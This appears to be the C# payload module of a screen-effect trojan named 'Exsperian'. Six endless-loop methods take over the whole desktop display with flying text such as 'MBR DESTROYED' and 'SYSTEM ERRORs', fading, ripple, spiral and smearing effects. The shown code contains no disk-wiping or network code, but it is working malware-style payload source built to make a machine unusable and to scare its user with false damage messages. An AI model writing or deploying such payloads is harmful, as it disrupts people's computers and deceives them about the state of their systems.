using System;
using static Vanara.PInvoke.User32;
using static Vanara.PInvoke.Kernel32;
using static Vanara.PInvoke.Gdi32;
using System.Drawing;
using Vanara.PInvoke;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;

namespace Exsperian
{
    public class Carga
    {
        private const int AC_SRC_OVER = 0x00;
        private const int BI_RGB = 0;
        private const uint DIB_RGB_COLORS = 0;

        [DllImport("gdi32.dll", CharSet = CharSet.Unicode)]
        private static extern IntPtr CreateFontIndirectW([In] ref LOGFONTW lplf);

        [DllImport("gdi32.dll")]
        private static extern bool TextOutA(IntPtr hdc, int x, int y, [MarshalAs(UnmanagedType.LPStr)] string lpString, int nCount);

        [DllImport("user32.dll")]
        static extern IntPtr GetDC(IntPtr Hwnd);
        private struct LOGFONTW
        {
            public int lfHeight;
            public int lfWidth;
            public int lfEscapement;
            public int lfOrientation;
            public int lfWeight;
            public byte lfItalic;
            public byte lfUnderline;
            public byte lfStrikeOut;
            public byte lfCharSet;
            public byte lfOutPrecision;
            public byte lfClipPrecision;
            public byte lfQuality;
            public byte lfPitchAndFamily;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
            public string lfFaceName;
        }

        public static void cls()
        {
            for (int num = 0; num < 10; num++)
            {
                InvalidateRect(IntPtr.Zero, null, true);
            }
        }

        private const int DRAFT_QUALITY = 1;

        private static readonly Random Rand = new Random();
        private static int w = Screen.PrimaryScreen.Bounds.Width;
        private static int h = Screen.PrimaryScreen.Bounds.Height;

        public static void EffectPay1()
        {
            var dc = GetDC(IntPtr.Zero);
            var dcCopy = CreateCompatibleDC(dc);

            LOGFONTW lFont = new LOGFONTW
            {
                lfWidth = 20,
                lfHeight = 50,
                lfOrientation = 100,
                lfWeight = 800,
                lfUnderline = 0,
                lfQuality = DRAFT_QUALITY,
                lfPitchAndFamily = (byte)(FontPitch.DEFAULT_PITCH | FontPitch.MONO_FONT)
            };

            lFont.lfFaceName = "Ravie";

            string[] strings =
            {
                "EXSPERIAN", "exsperian", "?????", "OMG!!", "COOF COOF", "3sxPeri4n", "Exsperian.exe", "MBR DESTROYED", "SYSTEM ERRORs"
            };

            while (true)
            {
                if (Rand.Next(25) == 24)
                {
                    lFont.lfEscapement = (short)(Rand.Next(70) * 30);

                    var hFont = CreateFontIndirectW(ref lFont);
                    SelectObject(dc, hFont);

                    SetTextColor(dc, Color.FromArgb(Rand.Next(256), Rand.Next(256), Rand.Next(256)).ToArgb());
                    SetBkColor(dc, Color.FromArgb(Rand.Next(160), Rand.Next(160), Rand.Next(160)).ToArgb());

                    int index = Rand.Next(strings.Length);
                    TextOutA(dc, Rand.Next(w), Rand.Next(h), strings[index], strings[index].Length);

                    if (Rand.Next(25) == 24)
                    {
                        BitBlt(dc, 1, 0, w, h, dc, 0, 1, RasterOperationMode.SRCCOPY);
                    }
                    else
                    {
                        BitBlt(dc, 1, 0, w, h, dc, 0, 1, RasterOperationMode.SRCCOPY);
                    }

                    Thread.Sleep(Rand.Next(10));
                }
            }
        }

        public static void EffectPay2()
        {
            IntPtr dc = GetDC(IntPtr.Zero);
            var dcCopy = CreateCompatibleDC(dc);
            int w = Screen.PrimaryScreen.Bounds.Width;
            int h = Screen.PrimaryScreen.Bounds.Height;

            BITMAPINFO bmpi = new BITMAPINFO();
            bmpi.bmiHeader.biSize = (uint)Marshal.SizeOf(bmpi.bmiHeader);
            bmpi.bmiHeader.biWidth = w;
            bmpi.bmiHeader.biHeight = -h; // Corrigir para orientação correta
            bmpi.bmiHeader.biPlanes = 1;
            bmpi.bmiHeader.biBitCount = 32;
            bmpi.bmiHeader.biCompression = BI_RGB;

            IntPtr bits;
            var hBitmap = CreateDIBSection(dc, ref bmpi, DIB_RGB_COLORS, out bits, IntPtr.Zero, 0);
            SelectObject(dcCopy, hBitmap);

            int radius = 0;

            while (true)
            {
                StretchBlt(dcCopy, 0, 0, w, h, dc, 0, 0, w, h, RasterOperationMode.SRCCOPY);

                unsafe
                {
                    RGBQUAD* rgbquad = (RGBQUAD*)bits;

                    for (int x = 0; x < w; x++)
                    {
                        for (int y = 0; y < h; y++)
                        {
                            int dx = x - 1000;
                            int dy = y - 500;
                            double distance = Math.Sqrt(dx * dx + dy * dy);

                            if (distance <= radius)
                            {
                                int index = y * w + x;
                                byte transparency = (byte)((distance / radius) * 200);
                                rgbquad[index].rgbReserved = transparency;
                            }
                        }
                    }
                }

                BLENDFUNCTION blendFunction = new BLENDFUNCTION
                {
                    BlendOp = AC_SRC_OVER,
                    BlendFlags = 0,
                    SourceConstantAlpha = 100,
                    AlphaFormat = 1
                };

                AlphaBlend(dc, 0, 0, w, h, dcCopy, 0, 0, w, h, blendFunction);

                radius += 10;
                if (radius > 80000)
                {
                    radius = 0;
                }

                Thread.Sleep(20);
            }
        }

        [DllImport("gdi32.dll", SetLastError = true)]
        private static extern IntPtr CreateCompatibleDC(IntPtr hDC);

        public static void EffectPay3()
        {
            int screenWidth = Screen.PrimaryScreen.Bounds.Width;
            int screenHeight = Screen.PrimaryScreen.Bounds.Height;
            Random random = new Random();

            while (true)
            {
                var hdc = GetDC(IntPtr.Zero);
                var mhdc = CreateCompatibleDC(hdc);
                var hbit = CreateCompatibleBitmap(hdc, screenWidth, screenHeight);
                var holdbit = SelectObject(mhdc, hbit);
                BitBlt(mhdc, 0, 0, screenWidth, screenHeight, hdc, 0, 0, RasterOperationMode.SRCCOPY);

                using (Graphics g = Graphics.FromHdc(mhdc))
                {
                    DrawRippleEffect(g, screenWidth, screenHeight, random);
                }

                BitBlt(hdc, 0, 0, screenWidth, screenHeight, mhdc, 0, 0, RasterOperationMode.SRCCOPY);

                SelectObject(mhdc, holdbit);
                DeleteObject(holdbit);
                DeleteObject(hbit);
                DeleteObject(mhdc);
                ReleaseDC(IntPtr.Zero, hdc);
            }
        }

        private static void DrawRippleEffect(Graphics g, int width, int height, Random random)
        {
            int centerX = random.Next(width);
            int centerY = random.Next(height);
            int maxRadius = Math.Min(width, height) / 10;
            int rippleCount = 5;
            int rippleSpacing = 60;

            using (Pen pen = new Pen(Color.FromArgb(255, random.Next(256), random.Next(256), random.Next(256)), 103))
            {
                for (int i = 0; i < rippleCount; i++)
                {
                    int radius = maxRadius + i * rippleSpacing;
                    g.DrawEllipse(pen, centerX - radius, centerY - radius, radius * 2, radius * 2);
                }
            }
        }

        public static void EffectPay4()
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            IntPtr dcCopy = CreateCompatibleDC(hdc);

            try
            {
                BITMAPINFO bmi = new BITMAPINFO();
                bmi.bmiHeader.biSize = (uint)Marshal.SizeOf(bmi);
                bmi.bmiHeader.biWidth = w;
                bmi.bmiHeader.biHeight = -h; // Corrigir para orientação correta
                bmi.bmiHeader.biPlanes = 1;
                bmi.bmiHeader.biBitCount = 32;
                bmi.bmiHeader.biCompression = BI_RGB;

                IntPtr ppvBits;
                var hbmp = CreateDIBSection(hdc, ref bmi, BI_RGB, out ppvBits, IntPtr.Zero, 0);
                var oldBmp = SelectObject(dcCopy, hbmp);

                double angle = 0;
                double angleIncrement = 0.1;
                int numLines = 111;
                int centerX = w / 2;
                int centerY = h / 2;

                Random random = new Random();

                while (true)
                {
                    using (Graphics g = Graphics.FromHdc(dcCopy))
                    {
                        g.Clear(Color.Transparent);

                        for (int i = 0; i < numLines; i++)
                        {
                            double currentAngle = angle + i * angleIncrement;
                            double x = centerX + 50 * i * Math.Cos(currentAngle);
                            double y = centerY + 50 * i * Math.Sin(currentAngle);

                            Color randomColor = Color.FromArgb(random.Next(200), random.Next(210), random.Next(200));
                            Pen pen = new Pen(randomColor, 1);

                            g.DrawLine(pen, (float)x, (float)y, centerX, centerY);
                        }
                    }

                    BitBlt(hdc, 0, 0, w, h, dcCopy, 0, 0, RasterOperationMode.SRCCOPY);

                    angle += 0.01;
                }
            }
            finally
            {
                DeleteDC(dcCopy);
                ReleaseDC(IntPtr.Zero, hdc);
            }
        }

        public static void EffectPay5()
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            IntPtr dcCopy = CreateCompatibleDC(hdc);

            try
            {
                BITMAPINFO bmi = new BITMAPINFO();
                bmi.bmiHeader.biSize = (uint)Marshal.SizeOf(bmi);
                bmi.bmiHeader.biWidth = w;
                bmi.bmiHeader.biHeight = -h;
                bmi.bmiHeader.biPlanes = 1;
                bmi.bmiHeader.biBitCount = 32;
                bmi.bmiHeader.biCompression = (int)BI_RGB;

                IntPtr ppvBits;
                var hbmp = CreateDIBSection(hdc, ref bmi, BI_RGB, out ppvBits, IntPtr.Zero, 0);
                var oldBmp = SelectObject(dcCopy, hbmp);

                double angle = 32;
                double amplitude = 200000;
                double frequency = 0.1;

                while (true)
                {
                    using (Graphics g = Graphics.FromHdc(dcCopy))
                    {
                        g.Clear(Color.Black);

                        for (int y = 0; y < h; y++)
                        {
                            int offset = (int)(amplitude * Math.Sin(y * frequency * angle + (Math.PI * 10)));
                            Color color = Color.FromArgb((y * 255 / h), 0, 0);
                            Pen pen = new Pen(color, 1);

                            g.DrawLine(pen, 0, y, w + offset, y);
                        }
                    }

                    BitBlt(hdc, 0, 0, w, h, dcCopy, 0, 0, RasterOperationMode.SRCCOPY);

                    angle += 0.05;
                    Thread.Sleep(3);
                }
            }
            finally
            {
                DeleteDC(dcCopy);
                ReleaseDC(IntPtr.Zero, hdc);
            }
        }

        public static void EffectPay6()
        {
            int left = Screen.PrimaryScreen.Bounds.Left;
            int right = Screen.PrimaryScreen.Bounds.Right;
            int top = Screen.PrimaryScreen.Bounds.Top;
            int bottom = Screen.PrimaryScreen.Bounds.Bottom;
            int w = right - left;
            int h = bottom - top;

            POINT[] lppoint = new POINT[3];
            uint[] rndclr = { 0x1B4BE8, 0x7C8D0F, 0xF51D1D, 0x21BDFF };

            while (true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                var mhdc = CreateCompatibleDC(hdc);
                var hbit = CreateCompatibleBitmap(hdc, w, h);
                var holdbit = SelectObject(mhdc, hbit);
                var Brush = CreateSolidBrush(rndclr[1]);
                SelectObject(hdc, Brush);
                lppoint[0].X = left + 50;
                lppoint[0].Y = top - 50;
                lppoint[1].X = right + 50;
                lppoint[1].Y = top + 50;
                lppoint[2].X = left - 50;
                lppoint[2].Y = bottom - 50;

                PlgBlt(hdc, lppoint, hdc, left - 20, top - 20, w + 40, h + 40, IntPtr.Zero, 0, 0);
                PlgBlt(hdc, lppoint, hdc, left + 20, top + 20, w - 40, h - 40, IntPtr.Zero, 0, 0);
                PlgBlt(hdc, lppoint, hdc, left + 20, top + 20, w - 40, h - 40, IntPtr.Zero, 0, 0);

                StretchBlt(hdc, 0, h, w, -h, hdc, 0, 0, w, h, RasterOperationMode.SRCCOPY);
                BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, RasterOperationMode.MERGECOPY);
                StretchBlt(hdc, 0, -h, w, h, hdc, 0, 0, w, h, RasterOperationMode.SRCCOPY);

                DeleteDC(hdc);
                ReleaseDC(IntPtr.Zero, hdc);
            }
        }
    }
}
